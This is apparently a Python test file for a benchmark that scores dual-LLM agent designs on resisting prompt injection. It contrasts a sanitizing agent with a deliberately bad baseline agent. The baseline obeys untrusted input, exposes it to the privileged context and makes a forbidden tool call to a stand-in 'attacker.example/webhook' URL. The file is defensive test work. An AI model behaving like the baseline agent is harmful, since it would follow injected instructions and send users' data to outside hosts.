from __future__ import annotations

from dual_llm_bench import BenchmarkSuite, CostEfficiency, LatencyOverhead, built_in_metrics
from dual_llm_bench.models import AgentTrace, PolicyVerdict, ToolRequest
from dual_llm_bench.runners import CallableRunner


def good_dual_agent(sample):
    return AgentTrace(
        sample_id=sample.id,
        privileged_input=(
            f"User goal: {sample.user_goal}. Sanitized facts: "
            f"{', '.join(sample.expected_facts)}. Suspicious markers were detected upstream."
        ),
        quarantined_output={
            "summary": f"Business facts: {', '.join(sample.expected_facts)}",
            "suspicious_instructions": sample.attack_markers,
            "sanitization_notes": ["Removed attacker-controlled instructions."],
        },
        policy_verdict=sample.expected_decision.verdict,
        tool_request=ToolRequest(
            name="create_ticket",
            arguments={"queue": "security-review"},
            rationale="Suspicious third-party authority requires review.",
        ),
        final_outcome=f"Created review ticket with facts: {', '.join(sample.expected_facts)}",
    )


def bad_baseline_agent(sample):
    return AgentTrace(
        sample_id=sample.id,
        privileged_input=sample.untrusted_input,
        quarantined_output=None,
        policy_verdict=PolicyVerdict.ALLOW,
        tool_request=ToolRequest(
            name=next(iter(sample.expected_decision.forbidden_tools)),
            arguments={"url": "https://attacker.example/webhook"},
            rationale="Raw content requested this action.",
        ),
        final_outcome=sample.untrusted_input,
    )


def test_good_dual_agent_scores_high():
    suite = BenchmarkSuite.from_builtin("pycon-core")
    report = suite.run(CallableRunner(good_dual_agent), metrics=built_in_metrics())

    assert report.overall_score >= 0.85
    assert all(score >= 0.7 for score in report.metric_scores().values())


def test_bad_baseline_agent_scores_low():
    suite = BenchmarkSuite.from_builtin("pycon-core")
    report = suite.run(CallableRunner(bad_baseline_agent), metrics=built_in_metrics())

    assert report.overall_score < 0.55
    assert report.metric_scores()["privileged_context_exposure"] < 0.5
    assert report.metric_scores()["injection_resistance"] < 0.5


def test_built_in_metrics_can_include_performance_metrics():
    metrics = built_in_metrics(
        include_performance=True,
        latency_baseline_ms=1_000,
        cost_budget_usd=0.02,
    )

    latency_metric = next(metric for metric in metrics if isinstance(metric, LatencyOverhead))
    cost_metric = next(metric for metric in metrics if isinstance(metric, CostEfficiency))

    assert latency_metric.baseline_ms == 1_000
    assert cost_metric.budget_usd == 0.02


def test_built_in_metrics_excludes_performance_metrics_by_default():
    metrics = built_in_metrics()

    assert not any(isinstance(metric, LatencyOverhead) for metric in metrics)
    assert not any(isinstance(metric, CostEfficiency) for metric in metrics)
